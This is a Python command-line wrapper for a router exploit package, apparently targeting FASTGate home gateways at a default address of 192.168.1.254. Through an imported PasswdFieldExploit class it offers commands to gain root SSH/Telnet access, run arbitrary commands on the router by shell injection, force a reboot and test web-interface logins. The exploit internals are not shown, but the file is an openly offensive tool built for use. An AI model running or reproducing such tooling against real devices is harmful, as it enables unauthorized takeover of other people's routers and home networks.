import click

from fastgate.exploits.pwd_field import PasswdFieldExploit


@click.group()
@click.option("--host", "-h", default="192.168.1.254", envvar="FASTGATE_HOST", required=False,
              help="IP address or hostname")
@click.option("--port", "-p", default=80, envvar="FASTGATE_PORT", required=False, type=int, help="HTTP port")
@click.pass_context
def cli(ctx, host, port):
    ctx.obj = PasswdFieldExploit(host, port)


@cli.command()
@click.pass_obj
def get_root(fgate):
    """Attempt to enable access to SSH/Telnet."""
    fgate.get_root()


@cli.command()
@click.argument('cmd', type=str, nargs=-1)
@click.pass_obj
def shell(fgate, cmd):
    """Run command on router with shell injection (no output)."""
    _cmd = " ".join(cmd)
    fgate.shell(_cmd)


@cli.command()
@click.pass_obj
def reboot(fgate):
    """Reboot router."""
    fgate.shell("reboot")


@cli.command()
@click.option("--user", "-u", prompt="Username", help="Username")
@click.option("--passwd", "-p", prompt="Password", help="Password", hide_input=True)
@click.pass_obj
def check_login(fgate, user, passwd):
    """Check web UI authentication."""
    if fgate.check_login(user, passwd):
        print("Login successful")
    else:
        print("Login unsuccessful")
